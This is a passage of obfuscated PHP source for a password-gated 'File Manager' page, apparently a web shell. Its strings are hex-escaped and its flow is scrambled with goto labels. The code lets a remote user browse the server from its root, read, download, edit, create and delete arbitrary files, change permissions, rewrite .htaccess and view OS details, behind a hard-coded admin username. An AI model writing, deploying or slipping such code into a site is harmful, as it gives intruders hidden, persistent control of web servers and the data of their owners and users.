"\x6d\145\x73\x73\141\147\145" => "\x44\151\162\145\153\x74\x6f\x72\151\x20\164\x69\x64\x61\x6b\40\153\157\x73\157\x6e\x67"); } if (@rmdir($realDeletePath)) { return array("\x73\x75\x63\143\145\x73\163" => true, "\155\145\x73\x73\141\147\x65" => "\x46\157\154\144\145\162\40\x62\145\x72\150\141\x73\x69\154\x20\144\151\x68\141\160\165\x73\41"); } } else { if (@unlink($realDeletePath)) { return array("\163\x75\x63\x63\x65\x73\163" => true, "\x6d\x65\163\x73\x61\x67\145" => "\x46\151\154\x65\x20\142\x65\x72\150\x61\x73\151\154\40\x64\x69\x68\141\160\x75\163\41"); } } return array("\163\x75\x63\x63\145\163\163" => false, "\155\145\x73\163\141\x67\145" => "\x47\141\x67\141\154\40\x6d\145\x6e\147\x68\x61\x70\x75\163\41"); } public function handleView() { if (!isset($_GET["\166\151\x65\x77"])) { return false; } $viewPath = $_GET["\166\x69\145\167"]; $realPath = realpath($viewPath); if ($realPath === false || !is_file($realPath)) { return false; } if (!is_readable($realPath)) { return false; } $extension = strtolower(pathinfo($realPath, PATHINFO_EXTENSION)); if (in_array($extension, $this->allowedExtensions)) { return array("\x70\x61\164\150" => $realPath, "\x63\x6f\156\164\x65\156\x74" => @file_get_contents($realPath), "\156\141\x6d\x65" => basename($realPath), "\145\x78\164\145\156\x73\151\157\x6e" => $extension); } return false; } public function handleEdit() { if (!isset($_GET["\145\x64\x69\x74"])) { return false; } $editPath = $_GET["\145\x64\151\164"]; $realPath = realpath($editPath); if ($realPath === false || !is_file($realPath)) { return false; } if (!is_readable($realPath) || !is_writable($realPath)) { return false; } $name = basename($realPath); $extension = strtolower(pathinfo($realPath, PATHINFO_EXTENSION)); if ($name === "\56\150\x74\141\143\143\x65\x73\163" || in_array($extension, $this->allowedExtensions)) { return array("\x70\x61\164\x68" => $realPath, "\143\157\156\x74\145\x6e\164" => @file_get_contents($realPath), "\156\x61\x6d\145" => $name, "\x65\170\x74\x65\x6e\163\x69\x6f\156" => $extension); } return false; } public function handleSaveEdit() { if (!isset($_POST["\x73\x61\x76\145\137\145\x64\x69\164"]) || !isset($_POST["\x65\144\x69\164\x5f\x70\141\x74\x68"]) || !isset($_POST["\146\151\x6c\x65\137\x63\x6f\156\164\145\x6e\x74"])) { return array("\163\165\x63\x63\x65\163\x73" => false, "\155\x65\x73\x73\x61\147\x65" => "\104\141\164\x61\x20\x74\x69\144\141\x6b\x20\x6c\145\x6e\147\x6b\141\x70"); } $editPath = $_POST["\x65\x64\x69\164\x5f\x70\x61\x74\150"]; $content = $_POST["\146\151\154\145\137\x63\x6f\x6e\164\x65\156\164"]; $realPath = realpath($editPath); if ($realPath === false || !is_file($realPath)) { return array("\163\x75\143\143\145\163\163" => false, "\x6d\145\x73\163\141\x67\x65" => "\x46\151\154\145\x20\164\151\144\x61\x6b\40\144\151\x74\145\155\165\153\x61\x6e"); } if (!is_writable($realPath)) { return array("\x73\165\143\x63\145\x73\163" => false, "\155\x65\163\163\141\147\145" => "\106\x69\x6c\x65\x20\164\x69\144\141\153\40\x64\x61\160\x61\164\x20\144\x69\x74\x75\x6c\151\163"); } $name = basename($realPath); $extension = strtolower(pathinfo($realPath, PATHINFO_EXTENSION)); if ($name !== "\x2e\150\164\141\143\x63\x65\163\163" && !in_array($extension, $this->allowedExtensions)) { return array("\163\165\x63\x63\x65\163\x73" => false, "\x6d\x65\163\163\141\x67\x65" => "\124\x69\160\x65\x20\x66\151\154\145\40\x74\x69\x64\x61\153\40\x64\151\x64\x75\x6b\165\156\x67\x20\165\x6e\164\165\153\x20\145\x64\x69\164\x69\x6e\147"); } $backupPath = $realPath . "\x2e\142\141\x63\x6b\x75\x70\56" . date("\131\55\155\55\x64\55\x48\55\151\55\163"); if (!@copy($realPath, $backupPath)) { return array("\x73\x75\143\x63\145\163\163" => false, "\155\x65\163\163\141\147\x65" => "\107\x61\147\x61\154\40\155\x65\x6d\x62\x75\141\164\x20\142\x61\x63\x6b\x75\x70\40\146\151\154\x65"); } if (@file_put_contents($realPath, $content) !== false) { return array("\x73\x75\x63\x63\145\163\x73" => true, "\x6d\145\163\163\x61\x67\145" => "\x46\151\x6c\x65\40\142\145\x72\x68\141\x73\151\x6c\x20\144\x69\163\151\155\160\141\156\41\40\x42\x61\143\x6b\x75\x70\x20\144\151\x62\165\x61\x74\x20\x64\x69\x3a\40" . basename($backupPath)); } return array("\163\x75\x63\143\x65\163\x73" => false, "\155\x65\x73\x73\x61\147\145" => "\x47\141\x67\x61\x6c\40\155\145\x6e\x79\x69\x6d\x70\x61\x6e\x20\146\x69\x6c\x65\41"); } public function handleCreateFile() { if (!isset($_POST["\x63\162\x65\x61\164\x65\137\x66\x69\154\x65"]) || empty($_POST["\x66\x69\154\145\137\x6e\x61\x6d\145"]) || !isset($_POST["\x66\151\154\145\x5f\143\157\156\x74\145\x6e\x74"])) { return array("\x73\165\143\143\145\x73\x73" => false, "\x6d\145\163\163\x61\147\x65" => "\104\141\164\x61\x20\x74\x69\x64\x61\153\40\154\x65\156\x67\153\x61\x70"); } $fileName = trim($_POST["\x66\x69\x6c\145\137\x6e\x61\155\145"]); $content = $_POST["\146\151\154\145\x5f\143\157\x6e\164\145\x6e\164"]; if (empty($fileName) || preg_match("\57\x5b\x3c\76\x3a\42\134\57\x5c\174\x3f\x2a\x5d\x2f", $fileName)) { return array("\x73\165\x63\143\145\163\x73" => false, "\155\x65\163\x73\x61\147\x65" => "\116\x61\155\141\x20\146\151\154\145\40\164\151\x64\141\x6b\x20\166\x61\154\151\x64"); } $extension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION)); if (empty($extension)) { $fileName .= "\x2e\164\170\x74"; } $extension = strtolower(pathinfo($fileName, PATHINFO_EXTENSION)); if (!in_array($extension, $this->allowedExtensions)) { return array("\163\165\x63\143\145\x73\163" => false, "\155\145\x73\163\141\x67\145" => "\105\x6b\163\x74\145\x6e\x73\x69\x20\146\x69\154\145\40\x74\x69\144\141\x6b\40\x64\x69\144\x75\153\165\x6e\147"); } $targetFile = $this->currentPath . DIRECTORY_SEPARATOR . $fileName; if (!is_writable($this->currentPath)) { return array("\163\165\143\x63\145\163\x73" => false, "\155\x65\x73\163\141\x67\145" => "\x44\x69\162\145\x6b\x74\x6f\162\151\x20\x74\151\x64\x61\153\x20\x64\141\x70\x61\x74\40\144\x69\x74\165\x6c\151\163"); } if (file_exists($targetFile)) { return array("\163\165\x63\143\x65\163\x73" => false, "\x6d\x65\x73\x73\141\147\145" => "\x46\151\154\x65\40\163\165\144\141\150\40\x61\144\x61"); } if (@file_put_contents($targetFile, $content) !== false) { return array("\163\x75\x63\x63\x65\x73\x73" => true, "\155\x65\163\x73\141\147\x65" => "\x46\x69\154\145\40\x62\145\x72\x68\141\163\151\154\x20\x64\151\142\x75\141\x74\41"); } return array("\163\x75\143\x63\x65\163\x73" => false, "\x6d\x65\x73\x73\141\x67\145" => "\107\141\147\x61\154\40\155\x65\x6d\142\165\x61\x74\40\146\151\154\x65\x21"); } public function handleChangePermission() { if (!isset($_POST["\x63\150\141\156\x67\x65\x5f\x70\145\x72\155\151\163\x73\x69\x6f\x6e"]) || !isset($_POST["\160\145\162\x6d\x69\x73\163\x69\x6f\156\137\160\141\164\x68"]) || !isset($_POST["\160\145\x72\155\151\x73\163\x69\157\156\x5f\155\157\x64\x65"])) { return array("\163\x75\x63\x63\x65\x73\x73" => false, "\x6d\145\x73\x73\x61\147\145" => "\x44\x61\164\141\40\x74\x69\x64\141\153\40\x6c\145\x6e\147\x6b\x61\x70"); } $permissionPath = $_POST["\160\145\162\x6d\x69\x73\x73\x69\x6f\156\x5f\160\x61\x74\x68"]; $permissionMode = $_POST["\160\x65\x72\x6d\151\163\x73\x69\x6f\156\137\x6d\x6f\144\x65"]; $realPath = realpath($permissionPath); if ($realPath === false || !file_exists($realPath)) { return array("\163\165\143\143\145\163\163" => false, "\155\x65\163\163\x61\147\x65" => "\x46\151\x6c\145\x2f\146\157\154\x64\145\162\40\x74\x69\144\x61\153\x20\x64\151\164\145\155\165\x6b\141\x6e"); } if (!preg_match("\57\x5e\133\x30\55\67\135\173\x33\54\64\x7d\x24\57", $permissionMode)) { return array("\163\165\x63\143\x65\x73\163" => false, "\x6d\x65\163\163\x61\x67\x65" => "\x46\157\162\x6d\x61\164\40\x70\145\162\x6d\x69\163\163\151\x6f\x6e\x20\x74\x69\x64\x61\x6b\x20\166\141\x6c\151\144\x20\50\x67\165\x6e\141\x6b\x61\156\40\x33\55\x34\x20\x64\x69\147\151\x74\40\141\156\x67\153\x61\x20\x30\55\67\51"); } $octalMode = octdec($permissionMode); if (!is_writable(dirname($realPath))) { return array("\163\x75\143\x63\145\163\x73" => false, "\x6d\x65\163\x73\141\147\x65" => "\124\151\x64\141\x6b\x20\144\141\x70\x61\164\40\x6d\145\156\147\x75\142\141\x68\40\160\x65\162\x6d\151\163\x73\151\x6f\x6e"); } if (@chmod($realPath, $octalMode)) { $newPerms = $this->getFilePermissions($realPath); return array("\163\x75\143\x63\145\x73\x73" => true, "\x6d\x65\163\163\141\147\145" => "\120\145\162\155\151\163\x73\x69\x6f\156\40\x62\145\162\150\x61\163\151\154\40\x64\x69\165\142\141\150\x21\x20\120\145\162\x6d\151\163\x73\151\157\156\40\x62\141\162\165\72\x20" . $newPerms . "\x20\x28" . $permissionMode . "\51"); } return array("\163\165\143\143\145\163\163" => false, "\155\x65\x73\x73\x61\x67\145" => "\x47\141\x67\141\154\40\x6d\145\156\x67\x75\142\141\150\x20\x70\x65\x72\x6d\x69\x73\x73\x69\157\156\x21"); } public function getPermissionNumeric($path) { $perms = @fileperms($path); if ($perms === false) { return "\x30\60\60"; } return substr(sprintf("\x25\157", $perms), -3); } public function getPermissionDescription($path) { $perms = @fileperms($path); if ($perms === false) { return "\124\151\144\x61\153\x20\144\141\160\x61\164\40\155\145\155\x62\x61\143\x61\40\160\145\162\155\x69\x73\x73\151\157\156"; } $isDir = is_dir($path); $owner = $perms & 256 ? "\162" : "\x2d"; $owner .= $perms & 128 ? "\x77" : "\55"; $owner .= $perms & 64 ? $isDir ? "\x78" : "\55" : "\x2d"; $group = $perms & 32 ? "\162" : "\x2d"; $group .= $perms & 16 ? "\x77" : "\55"; $group .= $perms & 8 ? $isDir ? "\x78" : "\55" : "\x2d"; $others = $perms & 4 ? "\x72" : "\x2d"; $others .= $perms & 2 ? "\x77" : "\x2d"; $others .= $perms & 1 ? $isDir ? "\170" : "\x2d" : "\x2d"; $description = array(); if ($perms & 256) { $description[] = "\x4f\167\x6e\x65\162\x20\x64\141\160\x61\x74\40\x6d\x65\155\142\x61\x63\141"; } if ($perms & 128) { $description[] = "\x4f\167\156\145\x72\x20\x64\x61\x70\141\164\40\155\x65\156\x75\x6c\151\x73"; } if ($perms & 64) { $description[] = $isDir ? "\117\167\x6e\x65\x72\40\144\x61\160\141\x74\x20\x6d\145\156\x67\141\153\163\x65\x73\40\x64\151\x72\145\x6b\164\157\x72\151" : "\117\x77\156\x65\x72\x20\x64\x61\160\141\x74\40\x6d\145\x6e\x67\x65\153\163\145\153\165\163\151"; } if ($perms & 32) { $description[] = "\x47\x72\x6f\165\x70\40\144\x61\x70\141\164\40\x6d\145\x6d\142\x61\x63\x61"; } if ($perms & 16) { $description[] = "\x47\x72\157\165\160\x20\x64\x61\160\x61\164\x20\x6d\x65\156\165\x6c\151\x73"; } if ($perms & 8) { $description[] = $isDir ? "\x47\162\x6f\x75\160\x20\x64\x61\x70\141\164\x20\155\x65\156\147\x61\153\163\145\x73\40\144\151\x72\145\153\x74\x6f\162\151" : "\107\x72\x6f\x75\x70\40\144\x61\x70\x61\x74\x20\155\x65\156\x67\145\153\x73\x65\x6b\x75\x73\x69"; } if ($perms & 4) { $description[] = "\x4f\164\x68\x65\x72\x73\40\x64\141\x70\141\x74\40\155\x65\x6d\142\x61\143\141"; } if ($perms & 2) { $description[] = "\117\x74\x68\145\x72\163\40\144\141\160\x61\x74\x20\x6d\145\x6e\165\x6c\x69\x73"; } if ($perms & 1) { $description[] = $isDir ? "\x4f\x74\x68\x65\162\x73\x20\144\141\160\x61\x74\40\155\x65\x6e\147\141\153\x73\x65\163\40\144\x69\162\145\x6b\x74\157\x72\151" : "\117\x74\150\x65\x72\163\x20\x64\x61\160\x61\164\40\x6d\145\156\147\x65\x6b\x73\145\x6b\165\163\x69"; } return implode("\54\40", $description); } public function getServerRoot() { $possibleRoots = array($_SERVER["\x44\x4f\x43\x55\115\x45\x4e\124\137\122\x4f\117\x54"] ?? null, dirname($_SERVER["\123\103\x52\x49\120\x54\x5f\x46\x49\114\105\x4e\101\x4d\105"]), getcwd(), "\x2f", "\103\x3a\x5c", "\x44\x3a\x5c", "\105\x3a\x5c", "\x46\72\134", "\x47\x3a\x5c", "\x48\72\134"); foreach ($possibleRoots as $root) { if ($root && is_dir($root) && is_readable($root)) { return $root; } } return getcwd(); } public function getAllowedExtensions() { return $this->allowedExtensions; } public function isHtaccessFile($path) { return basename($path) === "\x2e\x68\164\x61\x63\143\145\163\x73"; } public function getHtaccessIcon() { return "\342\x9a\231\357\270\217"; } public function getHtaccessDescription() { return "\x41\x70\141\x63\x68\x65\x20\103\157\156\x66\151\147\165\162\x61\x74\x69\157\x6e\40\x46\151\154\x65\40\55\x20\115\145\x6e\x67\141\x74\x75\162\x20\160\x65\156\147\141\x74\165\x72\141\156\40\x73\x65\x72\x76\x65\162\x20\x77\145\142\40\x41\160\141\143\x68\x65"; } public function getDirectoryTree($path = null, $maxDepth = 3, $currentDepth = 0) { if ($path === null) { $path = $this->getServerRoot(); } if ($currentDepth >= $maxDepth || !is_dir($path) || !is_readable($path)) { return array(); } $tree = array(); $items = @scandir($path); if ($items === false) { return array(); } foreach ($items as $item) { if ($item === "\56" || $item === "\56\x2e") { continue; } $fullPath = $path . DIRECTORY_SEPARATOR . $item; if (!is_readable($fullPath)) { continue; } $treeItem = array("\156\141\155\145" => $item, "\x70\x61\x74\x68" => $fullPath, "\151\x73\104\x69\x72" => is_dir($fullPath), "\163\x69\172\x65" => is_file($fullPath) ? $this->formatSize(@filesize($fullPath)) : "\x46\x6f\x6c\x64\x65\162", "\x70\145\162\155\151\163\x73\x69\x6f\x6e\x73" => $this->getFilePermissions($fullPath), "\x69\x63\157\156" => $this->getIcon($fullPath), "\x6d\157\x64\x69\x66\151\145\x64" => date("\131\x2d\155\55\x64\x20\110\72\151\x3a\163", @filemtime($fullPath))); if ($treeItem["\151\163\104\151\x72"] && $currentDepth < $maxDepth - 1) { $treeItem["\143\x68\x69\154\x64\162\145\156"] = $this->getDirectoryTree($fullPath, $maxDepth, $currentDepth + 1); } $tree[] = $treeItem; } usort($tree, function ($a, $b) { if ($a["\x69\x73\x44\151\162"] && !$b["\151\x73\104\x69\162"]) { return -1; } if (!$a["\151\x73\x44\151\x72"] && $b["\151\x73\x44\151\162"]) { return 1; } return strcasecmp($a["\x6e\141\155\145"], $b["\x6e\141\155\145"]); }); return $tree; } public function searchFiles($query, $path = null, $maxResults = 100) { if ($path === null) { $path = $this->getServerRoot(); } $results = array(); $this->searchFilesRecursive($query, $path, $results, $maxResults); return $results; } private function searchFilesRecursive($query, $path, &$results, $maxResults) { if (count($results) >= $maxResults || !is_dir($path) || !is_readable($path)) { return; } $items = @scandir($path); if ($items === false) { return; } foreach ($items as $item) { if ($item === "\x2e" || $item === "\x2e\x2e") { continue; } $fullPath = $path . DIRECTORY_SEPARATOR . $item; if (!is_readable($fullPath)) { continue; } if (stripos($item, $query) !== false) { $results[] = array("\156\141\x6d\145" => $item, "\160\x61\164\150" => $fullPath, "\151\x73\x44\x69\x72" => is_dir($fullPath), "\x73\x69\x7a\145" => is_file($fullPath) ? $this->formatSize(@filesize($fullPath)) : "\106\x6f\x6c\144\x65\162", "\160\x65\162\x6d\x69\x73\163\x69\157\x6e\x73" => $this->getFilePermissions($fullPath), "\x69\143\x6f\156" => $this->getIcon($fullPath), "\155\157\x64\151\146\x69\145\x64" => date("\131\55\x6d\x2d\144\40\x48\72\151\72\x73", @filemtime($fullPath)), "\x72\x65\x6c\141\x74\151\x76\145\x50\x61\x74\x68" => str_replace($this->getServerRoot(), '', $fullPath)); } if (is_dir($fullPath)) { $this->searchFilesRecursive($query, $fullPath, $results, $maxResults); } } } } goto vy_NY; sw7wl: ini_set("\x64\x69\163\x70\x6c\x61\171\x5f\x65\162\162\x6f\x72\163", 0); goto iL0Vu; QnMzy: function sanitizePath($path) { return htmlspecialchars($path, ENT_QUOTES, "\x55\x54\106\x2d\x38"); } goto o0P7A; vy_NY: try { $fileManager = new FileManager(); $message = null; $viewData = null; if (isset($_GET["\x76\151\x65\x77"])) { $viewData = $fileManager->handleView(); if (isset($_SERVER["\110\x54\x54\120\137\130\137\x52\105\x51\125\105\123\124\x45\x44\x5f\x57\x49\x54\110"]) && strtolower($_SERVER["\x48\x54\124\x50\x5f\130\137\x52\x45\x51\x55\105\123\x54\x45\x44\137\x57\x49\x54\x48"]) === "\170\155\154\x68\164\164\160\162\x65\161\x75\x65\x73\x74") { header("\103\x6f\156\x74\x65\156\164\x2d\x54\x79\x70\x65\72\x20\x61\160\160\x6c\151\143\x61\x74\151\157\x6e\x2f\x6a\x73\x6f\156"); if ($viewData !== false) { $viewData["\x73\165\143\143\145\x73\163"] = true; $viewData["\x73\x69\172\145"] = $fileManager->formatSize(filesize($viewData["\x70\141\x74\150"])); $viewData["\155\x6f\x64\151\146\x69\145\144"] = date("\x59\x2d\x6d\x2d\x64\x20\110\72\x69\72\163", filemtime($viewData["\160\141\164\x68"])); $viewData["\x70\145\x72\155\x69\163\163\x69\x6f\x6e\x73"] = $fileManager->getFilePermissions($viewData["\x70\141\x74\x68"]) . "\x20\50" . $fileManager->getPermissionNumeric($viewData["\160\141\164\150"]) . "\51"; $viewData["\145\170\x74\x65\156\163\151\157\x6e"] = pathinfo($viewData["\160\x61\164\150"], PATHINFO_EXTENSION); } else { $viewData = array("\x73\165\x63\x63\x65\x73\163" => false, "\155\x65\x73\x73\x61\147\145" => "\x46\151\x6c\x65\x20\x74\151\144\x61\153\x20\x64\141\x70\x61\x74\40\x64\151\142\x61\x63\x61\40\141\x74\141\x75\x20\164\151\x64\141\153\40\144\151\x64\x75\x6b\165\x6e\147"); } echo json_encode($viewData); die; } if (isset($_GET["\144\157\x77\156\x6c\x6f\x61\x64"]) && $_GET["\144\157\167\x6e\x6c\157\141\x64"] === "\61" && $viewData !== false) { header("\x43\x6f\156\x74\x65\x6e\x74\55\124\171\160\145\72\40\141\x70\160\154\151\143\141\x74\x69\x6f\x6e\x2f\x6f\x63\164\x65\x74\x2d\x73\164\162\x65\x61\155"); header("\x43\157\156\164\145\x6e\x74\x2d\x44\x69\163\x70\157\163\151\x74\151\157\x6e\x3a\40\141\164\x74\x61\143\x68\x6d\x65\x6e\x74\73\x20\146\x69\x6c\x65\156\141\155\x65\x3d\x22" . basename($viewData["\x70\141\x74\150"]) . "\42"); header("\103\157\156\x74\x65\x6e\164\x2d\x4c\x65\x6e\147\x74\150\72\x20" . filesize($viewData["\x70\x61\164\150"])); echo $viewData["\143\x6f\156\164\145\x6e\x74"]; die; } } if ($_SERVER["\x52\105\121\x55\x45\123\x54\137\x4d\105\x54\110\x4f\x44"] === "\x50\117\x53\124") { if (isset($_POST["\165\160\154\157\x61\144"])) { $result = $fileManager->handleUpload(); $message = $result; } elseif (isset($_POST["\x63\162\x65\x61\x74\x65\137\146\157\154\x64\145\162"])) { $result = $fileManager->handleCreateFolder(); $message = $result; } elseif (isset($_POST["\x72\145\156\141\x6d\145"])) { $result = $fileManager->handleRename(); $message = $result; } elseif (isset($_POST["\144\x65\x6c\145\164\145\137\x70\141\x74\x68"])) { $result = $fileManager->handleDelete(); $message = $result; } elseif (isset($_POST["\x73\x61\166\x65\x5f\x65\x64\151\164"])) { $result = $fileManager->handleSaveEdit(); $message = $result; } elseif (isset($_POST["\143\x72\x65\141\x74\145\137\x66\x69\154\x65"])) { $result = $fileManager->handleCreateFile(); $message = $result; } elseif (isset($_POST["\x63\x68\x61\156\147\145\x5f\x70\x65\x72\x6d\x69\163\x73\151\157\156"])) { $result = $fileManager->handleChangePermission(); $message = $result; } } $currentPath = $fileManager->getCurrentPathValue(); $breadcrumbs = $fileManager->getBreadcrumbs(); $files = $fileManager->getFiles(); $serverRoot = $fileManager->getServerRoot(); $showTreeView = isset($_GET["\x74\162\145\x65"]) && $_GET["\164\162\145\145"] === "\61"; $showSearch = isset($_GET["\x73\145\141\162\143\150"]) && $_GET["\x73\x65\x61\162\x63\x68"] === "\61"; $searchQuery = isset($_GET["\x71"]) ? trim($_GET["\x71"]) : ''; $editMode = isset($_GET["\145\x64\151\x74"]); $editData = null; if ($editMode) { $editData = $fileManager->handleEdit(); if ($editData === false) { $editMode = false; } } $createFileMode = isset($_GET["\143\x72\x65\x61\x74\145\x5f\146\x69\x6c\145"]) && $_GET["\x63\162\x65\141\x74\145\x5f\146\x69\x6c\145"] === "\x31"; if ($showTreeView) { $directoryTree = $fileManager->getDirectoryTree(); } else { $directoryTree = array(); } if ($showSearch && !empty($searchQuery)) { $searchResults = $fileManager->searchFiles($searchQuery); } else { $searchResults = array(); } } catch (Exception $e) { $fileManager = null; $message = array("\163\165\143\x63\145\x73\x73" => false, "\155\x65\163\163\x61\147\x65" => "\124\145\162\152\x61\144\151\x20\x65\162\162\157\162\x20\144\141\154\141\155\40\x73\151\163\164\145\x6d"); $currentPath = getcwd(); $breadcrumbs = array(); $files = array(); $serverRoot = getcwd(); $showTreeView = false; $showSearch = false; $searchQuery = ''; $directoryTree = array(); $searchResults = array(); } goto e0BYc; zaKFv: $ADMIN_USERNAME = "\x61\x64\155\x69\x6e\163\165\x6e\147\147\x61\154"; goto fjnlk; jiCNf: if (!isAdminLoggedIn()) { ?>
<!doctypehtml><html lang="id"><head><meta charset="UTF-8"><meta content="width=device-width,initial-scale=1"name="viewport"><title>Admin Login - File Manager</title><link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css"rel="stylesheet"><style>*{margin:0;padding:0;box-sizing:border-box}body{background:linear-gradient(135deg,#0a0a1a 0,#1a1a3a 50%,#0a0a1a 100%);font-family:'Courier New',Monaco,Consolas,monospace;color:#00fff7;min-height:100vh;display:flex;align-items:center;justify-content:center;position:relative;overflow:hidden}body::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:radial-gradient(circle at 20% 80%,rgba(0,255,247,.1) 0,transparent 50%),radial-gradient(circle at 80% 20%,rgba(255,0,204,.1) 0,transparent 50%),radial-gradient(circle at 40% 40%,rgba(0,255,247,.05) 0,transparent 50%);pointer-events:none}.login-container{background:rgba(16,16,36,.9);border:2px solid #00fff7;border-radius:15px;box-shadow:0 0 30px rgba(0,255,247,.3),inset 0 0 30px rgba(0,255,247,.1);padding:40px;width:100%;max-width:400px;position:relative;backdrop-filter:blur(10px)}.login-container::before{content:'';position:absolute;top:-2px;left:-2px;right:-2px;bottom:-2px;background:linear-gradient(45deg,#00fff7,#f0c,#00fff7);border-radius:15px;z-index:-1;animation:borderGlow 3s ease-in-out infinite alternate}@keyframes borderGlow{0%{opacity:.5}100%{opacity:1}}.login-header{text-align:center;margin-bottom:30px}.login-header h1{font-size:1.8em;margin-bottom:10px;text-shadow:0 0 10px rgba(0,255,247,.5)}.login-header .icon{font-size:3em;margin-bottom:15px;animation:pulse 2s ease-in-out infinite}@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}.form-group{margin-bottom:20px;position:relative}.form-group input{width:100%;padding:15px 15px 15px 45px;border:2px solid rgba(0,255,247,.3);border-radius:10px;background:rgba(24,24,72,.8);color:#00fff7;font-size:1em;transition:all .3s ease;backdrop-filter:blur(5px)}.form-group input:focus{outline:0;border-color:#f0c;box-shadow:0 0 15px rgba(255,0,204,.3)}.form-group .input-icon{position:absolute;left:15px;top:50%;transform:translateY(-50%);color:rgba(0,255,247,.7);font-size:1.2em}.login-btn{width:100%;padding:15px;border:2px solid #00fff7;border-radius:10px;background:linear-gradient(45deg,#00fff7,#0cf);color:#0a0a1a;font-weight:700;font-size:1.1em;cursor:pointer;transition:all .3s ease;text-transform:uppercase;letter-spacing:1px}.login-btn:hover{background:linear-gradient(45deg,#f0c,#f6c);border-color:#f0c;box-shadow:0 0 20px rgba(255,0,204,.5);transform:translateY(-2px)}.login-error{background:rgba(255,0,0,.2);border:1px solid red;border-radius:8px;padding:12px;margin-bottom:20px;text-align:center;color:#f66;font-weight:700;animation:shake .5s ease-in-out}@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-5px)}75%{transform:translateX(5px)}}.security-notice{text-align:center;margin-top:20px;font-size:.8em;color:rgba(0,255,247,.6)}.floating-particles{position:absolute;width:100%;height:100%;pointer-events:none;overflow:hidden}.particle{position:absolute;width:2px;height:2px;background:#00fff7;border-radius:50%;animation:float 6s ease-in-out infinite}@keyframes float{0%,100%{transform:translateY(0) rotate(0);opacity:0}50%{transform:translateY(-100px) rotate(180deg);opacity:1}}</style></head><body><div class="floating-particles"><?php  for ($i = 0; $i < 20; $i++) { ?>
<div class="particle"style="left:<?php  echo rand(0, 100); ?>
%;animation-delay:<?php  echo rand(0, 6); ?>
s;animation-duration:<?php  echo rand(4, 8); ?>
s"></div><?php  } ?>
</div><div class="login-container"><div class="login-header"><div class="icon"><i class="fas fa-shield-alt"></i></div><h1>Admin Login</h1><p>File Manager Access</p></div><?php  if (isset($login_error)) { ?>
<div class="login-error"><i class="fas fa-exclamation-triangle"></i><?php  echo htmlspecialchars($login_error); ?>
</div><?php  } ?>
<form method="POST"autocomplete="off"><div class="form-group"><i class="fas input-icon fa-user"></i> <input name="username"placeholder="Username"required autofocus></div><div class="form-group"><i class="fas input-icon fa-lock"></i> <input name="password"placeholder="Password"required type="password"></div><button class="login-btn"type="submit"name="admin_login"><i class="fas fa-sign-in-alt"></i> Login</button></form><div class="security-notice"><i class="fas fa-shield-alt"></i> Secure Access Only</div></div><script>// Add some interactive effects
            document.addEventListener('DOMContentLoaded', function() {
                const inputs = document.querySelectorAll('input');
                inputs.forEach(input => {
                    input.addEventListener('focus', function() {
                        this.parentElement.style.transform = 'scale(1.02)';
                    });
                    
                    input.addEventListener('blur', function() {
                        this.parentElement.style.transform = 'scale(1)';
                    });
                });
            });</script></body></html><?php  die; } goto G3iQS; Wj98y: $GLOBALS["\x5f\137"] = function ($a, $b) { return $a . $b; }; goto QnMzy; xHJU4: echo htmlspecialchars($_SESSION["\141\144\155\x69\156\x5f\165\x73\145\x72\156\141\155\145"] ?? "\x41\x64\155\x69\x6e"); goto olPf3; vyPTZ: function isAdminLoggedIn() { global $LOGIN_TIMEOUT; if (!isset($_SESSION["\141\144\155\151\156\x5f\154\157\147\x67\145\x64\x5f\x69\x6e"]) || $_SESSION["\x61\144\x6d\x69\x6e\137\154\157\x67\147\x65\x64\137\x69\156"] !== true) { return false; } if (isset($_SESSION["\141\x64\x6d\x69\156\x5f\x6c\157\x67\151\156\x5f\x74\151\155\x65"]) && time() - $_SESSION["\141\144\155\151\x6e\137\x6c\157\147\x69\156\x5f\164\x69\155\145"] > $LOGIN_TIMEOUT) { session_destroy(); return false; } return true; } goto NEV1n; NEV1n: if (isset($_POST["\141\x64\155\x69\x6e\137\x6c\x6f\147\151\x6e"])) { $username = $_POST["\165\x73\145\162\x6e\141\x6d\x65"] ?? ''; $password = $_POST["\160\x61\163\163\x77\157\162\x64"] ?? ''; if ($username === $ADMIN_USERNAME && $password === $ADMIN_PASSWORD) { $_SESSION["\141\144\155\151\x6e\x5f\x6c\157\x67\x67\x65\144\x5f\151\x6e"] = true; $_SESSION["\x61\144\x6d\151\156\137\154\x6f\147\x69\156\137\164\x69\x6d\145"] = time(); $_SESSION["\141\144\155\151\x6e\137\165\x73\145\x72\x6e\141\x6d\x65"] = $username; header("\x4c\157\x63\x61\x74\151\x6f\x6e\72\40" . $_SERVER["\x50\x48\120\x5f\123\105\x4c\106"]); die; } else { $login_error = "\x55\x73\x65\162\156\x61\155\145\40\141\164\141\x75\40\160\x61\163\x73\x77\157\x72\144\x20\x73\x61\x6c\141\150\x21"; } } goto mEj2Q; G3iQS: $GLOBALS["\x5f"] = function ($s) { return $s; }; goto Wj98y; uSjNo: if ($fileManager) { ?>
<div class="server-info"><h3><i class="fas fa-server"></i> Informasi Server</h3><p><strong>Root Path:</strong><?php  echo sanitizePath($serverRoot); ?>
</p><p><strong>Current Path:</strong><?php  echo sanitizePath($currentPath); ?>
</p><p><strong>Server OS:</strong><?php  echo php_uname("\x73"); echo php_uname("\162"); ?>
</p><p><strong>PHP Version:</strong><?php  echo PHP_VERSION; ?>
</p></div><div class="nav-tabs"><a href="?"class="nav-tab<?php  echo !$showTreeView && !$showSearch && !$editMode && !$createFileMode ? "\x61\x63\x74\151\166\x65" : ''; ?>
"><i class="fas fa-folder"></i> File Manager </a><a href="?tree=1"class="nav-tab<?php  echo $showTreeView ? "\x61\x63\x74\x69\x76\x65" : ''; ?>
"><i class="fas fa-sitemap"></i> Tree View </a><a href="?search=1"class="nav-tab<?php  echo $showSearch ? "\141\x63\164\151\166\x65" : ''; ?>
"><i class="fas fa-search"></i> Search Files </a><a href="?create_file=1"class="nav-tab<?php  echo $createFileMode ? "\x61\143\x74\151\x76\145" : ''; ?>
"><i class="fas fa-file-plus"></i> Create File</a></div><?php  if ($showTreeView) { ?>
<div class="tree-view"><h3><i class="fas fa-sitemap"></i> Directory Tree (<?php  echo sanitizePath($serverRoot); ?>
